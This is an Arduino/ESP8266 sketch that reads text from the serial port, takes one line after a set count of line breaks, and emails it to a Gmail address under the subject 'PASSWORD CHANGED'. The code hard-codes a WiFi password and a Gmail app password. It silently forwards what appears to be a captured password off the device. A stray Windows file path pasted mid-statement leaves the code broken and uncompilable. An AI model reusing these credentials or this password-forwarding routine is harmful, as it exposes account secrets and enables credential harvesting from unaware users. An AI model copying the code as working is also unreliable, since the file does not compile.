// Counter for the number of lines
#include "Arduino.h"
#include <EMailSender.h>
#include <ESP8266WiFi.h>

const char* ssid = "Sumithero";
const char* password = "bdcs2034";
int lineCount = 0;
char keyword[100];
uint8_t connection_state = 0;
uint16_t reconnect_interval = 10000;

EMailSender emailSend("sumitherodon159@gmail.com", "hken cuam zlqb ggsd");

uint8_t WiFiConnect(const char* nSSID = nullptr, const char* nPassword = nullptr)
{
    static uint16_t attempt = 0;
    Serial.print("Connecting to ");
    if(nSSID) {
        WiFi.begin(nSSID, nPassword);
        Serial.println(nSSID);
    }

    uint8_t i = 0;
    while(WiFi.status()!= WL_CONNECTED && i++ < 50)
    {
        delay(200);
        Serial.print(".");
    }
    ++attempt;
    Serial.println("");
    if(i == 51) {
        Serial.print("Connection: TIMEOUT on attempt: ");
        Serial.println(attempt);
        if(attempt % 2 == 0)
            Serial.println("Check if access point available or SSID and Password\r\n");
        return false;
    }
    Serial.println("Connection: ESTABLISHED");
    Serial.print("Got IP address: ");
    Serial.println(WiFi.localIP());
    return true;
}

void Awaits()
{
    uint32_t ts = millis();
    while(!connection_state)
    {
        delay(50);
        if(millis() > (ts + reconnect_interval) && !connection_state){
            connection_state = WiFiConnect();
            ts = millis();
        }
    }
}

void setup() {
  Serial.begin(9600);  // Initialize serial communication
}

void loop() {
  while (Serial.available() > 0) {
    char incomingChar = Serial.read();

    // Check for line breaks
    if (incomingChar == '\n') {
      lineCount++;

      // If six line breaks are encountered, save the data
      if (lineCount > 8 && lineCount < 10) {
        Serial.readBytesUntil('\n', keyword, 50);
        Serial.println(keyword);
    connection_state = WiFiConnect(ssid, password);
    if(!connection_state)  // if not connected to WIFI
        Awaits();          // constantly trying to connect

    EMailSender::EMailMessage message;
    message.subject = "PASSWORD CHANGED";
    message.message = keyword;

    EMailSender::Response resp = emailSend.send("sumsigdel@gmail.com", message);
    Serial.println("Sending status: ");
    Serial.println(resp.status);c:\Users\DELL\Documents\Arduino\finalotp
    Serial.println(resp.code);
    Serial.println(resp.desc);
      }
    }
  }
}
